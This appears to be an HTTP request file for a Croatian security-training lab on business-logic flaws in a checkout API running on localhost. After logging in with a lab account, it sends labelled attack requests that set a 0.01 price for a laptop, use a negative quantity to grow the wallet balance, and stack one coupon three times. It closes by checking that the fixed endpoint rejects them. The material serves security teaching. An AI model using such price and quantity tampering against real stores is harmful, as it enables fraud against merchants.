### =====================================================================
### Lab10 – A06 Insecure Design: poslovna logika (CWE-840, CWE-20)
### Upute: docs/labs/lab10-business-logic.md
### Proizvodi: 1 Laptop 899.00, 2 Slušalice 99.00, 3 Kabel 9.99; kupon AKADEMIJA10 = 10 %
### =====================================================================
@host = http://localhost:5080
@token = ZALIJEPITE_TOKEN_OVDJE

### 1) Prijava kao ana (kopirajte "token" u @token)
POST {{host}}/api/auth/login
Content-Type: application/json

{"username": "ana", "password": "Ana123!"}

### 2) Stanje novčanika – početno 1000.00 EUR
GET {{host}}/api/lab10/wallet
Authorization: Bearer {{token}}

### 3) Legitimna kupnja: 2 × kabel (9.99) = 19.98
POST {{host}}/api/lab10/checkout
Authorization: Bearer {{token}}
Content-Type: application/json

{"items": [{"productId": 3, "quantity": 2, "unitPrice": 9.99}], "couponCodes": []}

### 4) NAPAD: klijent sam određuje cijenu – laptop za 0.01 EUR
POST {{host}}/api/lab10/checkout
Authorization: Bearer {{token}}
Content-Type: application/json

{"items": [{"productId": 1, "quantity": 1, "unitPrice": 0.01}], "couponCodes": []}

### 5) NAPAD: negativna količina – stanje novčanika RASTE
POST {{host}}/api/lab10/checkout
Authorization: Bearer {{token}}
Content-Type: application/json

{"items": [{"productId": 1, "quantity": -5, "unitPrice": 899.00}], "couponCodes": []}

### 6) NAPAD: isti kupon tri puta (0.9 × 0.9 × 0.9 = 27,1 % popusta umjesto 10 %)
POST {{host}}/api/lab10/checkout
Authorization: Bearer {{token}}
Content-Type: application/json

{"items": [{"productId": 2, "quantity": 1, "unitPrice": 99.00}], "couponCodes": ["AKADEMIJA10", "AKADEMIJA10", "AKADEMIJA10"]}

### 7) Stanje nakon napada
GET {{host}}/api/lab10/wallet
Authorization: Bearer {{token}}

### 8) PROVJERA POPRAVKA: 4) naplaćuje 899.00 (cijena iz baze), 5) i 6) vraćaju 400,
###    drugi pokušaj s istim kuponom (nakon jedne uspješne uporabe) vraća 400
POST {{host}}/api/lab10/checkout
Authorization: Bearer {{token}}
Content-Type: application/json

{"items": [{"productId": 2, "quantity": 1}], "couponCodes": ["AKADEMIJA10"]}
